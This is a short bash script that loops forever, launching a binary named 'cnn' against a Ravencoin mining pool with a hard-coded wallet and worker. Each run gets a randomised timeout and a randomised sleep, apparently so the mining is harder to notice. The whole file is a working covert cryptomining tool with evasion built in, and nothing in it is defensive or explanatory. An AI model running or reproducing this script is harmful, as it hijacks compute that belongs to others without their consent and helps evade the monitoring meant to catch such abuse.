while :
do

	x=$(($RANDOM%15))
	y=20
	z=$(($x+$y))

	a=$(($RANDOM%150))
	b=2400
	c=$(($a+$b))

	w=$(($RANDOM%60))
	e=260
	aaram=$(($w+$e))
	timeout -k 5 $c\s  ./cnn -P stratum+ssl://REJQ8UT8XJdsD3fCmqzJs2iv4YHtDw4BGa.worker:pps@us.ravenminer.com:13803 -U
	sleep $aaram
	echo "Kartik Bhai Amar Rahe"
done
